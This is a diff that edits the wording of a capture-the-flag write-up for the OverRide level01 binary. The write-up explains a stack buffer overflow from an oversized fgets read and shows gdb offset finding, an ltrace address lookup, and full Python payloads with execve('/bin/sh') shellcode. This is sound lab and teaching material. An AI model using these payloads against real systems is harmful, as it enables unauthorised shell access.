@@ -59,24 +59,25 @@ Here, we find 3 functions : `main`, `verify_user_name`, `verify_user_pass`.
 
 #### main function
 
-The `main` function ask for a username and verify it with `verify_user_name()`. Ff the username is valid, it ask a password and verify it with `verify_user_pass()`. But in anyway the program will print `"nope, incorrect password..."` and return `1`;
-Each time, the `fgets` made to get the user input are with a limited size of `0x100` (256 bytes in decimal). 
+The `main` function ask for a username and verify it with `verify_user_name()`. If the username is valid, it ask a password and verify it with `verify_user_pass()`. In any case, the program will print `"nope, incorrect password..."` and return `1`;
+Each time, the `fgets` calls used to get the user input have a limited size of `0x100` (256 bytes in decimal). 
 
 #### verify_user_name function
 
-The `verify_user_name` function compare the username given by the user to `"dat_wil"`. But its only check if the `7` first bytes is equal to this string. The following character of the username are not check.
+The `verify_user_name` function compares the username given by the user to `"dat_wil"`. But it only checks if the **first 7 bytes** are equal to this string. The following characters of the username are not check.
 
 #### verify_user_pass function
 
-The `verify_user_pass` function compare the pass given by the user to `"admin"`. But its only check if the `5` first bytes is equal to this string. The following character of the pass are not check.
+The `verify_user_pass` function compare the pass given by the user to `"admin"`. But it only checks if the **first 5 bytes** are equal to this string. The following characters of the pass are not check.
 
-## 3. Identify The Vulnerability
+## 3. Exploit Development
 
-First we can see that this `fgets(local_54,100,stdin)` call for the password is with a size of `256 bytes` but the `local_54` is only of a size of `64 bytes`. A buffer overflow is possible.
+First, we can see that the `fgets()` call for the password uses a size of **`256 bytes`**, for a `local_54` with a size of **64 bytes**.
+So a buffer overflow is possible.
 
 ---
 
-### Stack Overflow Explaination
+### Stack Overflow Explanation
 
 A **Stack Overflow Attack** consists of **writing more data** than the allocated space of a **local variable on the stack**, allowing us to overwrite critical values such as saved registers.
 
@@ -109,7 +110,7 @@ Terminology:
 The main difficulty here is deciding **where to redirect execution**. There is **no internal function** that directly **spawns a shell**.
 To solve this, we use an **external payload** called `shellcode`.
 
-### Shellcode Explaination
+### Shellcode Explanation
 
 A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal. It is not human-readable, and it is **executable by the CPU**. Like this following example :
 
@@ -121,9 +122,9 @@ A **shellcode** is a **sequence of machine instructions** encoded in hexadecimal
 
 ---
 
-### Found the Offset
+### Finding the Offset
 
-Using `gdb`, we can get the address of the segfault, and with a specific pattern payload we can easily get the offset. Here a example of payload:
+Using `gdb`, we can get the address of the segfault, and with a specific pattern payload we can easily get the offset. Here is an example payload:
 
 ```
 aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
@@ -147,7 +148,7 @@ Program received signal SIGSEGV, Segmentation fault.
 0x75757575 in ?? ()
 ```
 
-`0x75` is 117 in decimal and `u` in ASCII. So we got a offset of `80 bytes`.
+`0x75` is 117 in decimal and `u` in ASCII. So we have an offset of **`80 bytes`**.
 
 We can deduce this payload format :
 
@@ -163,7 +164,7 @@ We can deduce this payload format :
 
 ---
 
-We need to found the address of the password string, we can use `ltrace` to this the function call with their arguments and return value.
+We need to find the address of the password string, we can use `ltrace` to trace the function calls with their arguments and return value.
 
 ```bash
 level01@OverRide:~$ ltrace ./level01 
@@ -192,7 +193,8 @@ We need to put it in little endian :
 \xec\xd6\xff\xff
 ```
 
-We can also reverse it direclty in the python command with this regex expression `[::-1]` :
+We can also reverse it directly in the Python command with this slice notation `[::-1]` :
+
 ```
 > python3 -c 'print("\xff\xff\xd6\xec"[::-1])'
 \xec\xd6\xff\xff
@@ -201,13 +203,13 @@ We can also reverse it direclty in the python command with this regex expression
 ### Create The Payload
 
 ```bash
-python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff"'
+python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff'"
 ```
 
 And we need to put the username to:
 
 ```bash
-python -c 'print "dat_wil"'; sleep 1; python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff"'
+python -c "print 'dat_wil'"; sleep 1; python -c "print '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' + 'a' * 59 + '\xec\xd6\xff\xff'"
 ```
 
 ### Overflow Visualization
@@ -232,4 +234,4 @@ XXX
 exit
 ```
 
-`cat` here allow to keep `stdin` open after the payload injection, to use the shellcode.
+`cat` here allows keeping `stdin` open after the payload injection, to use the shellcode.
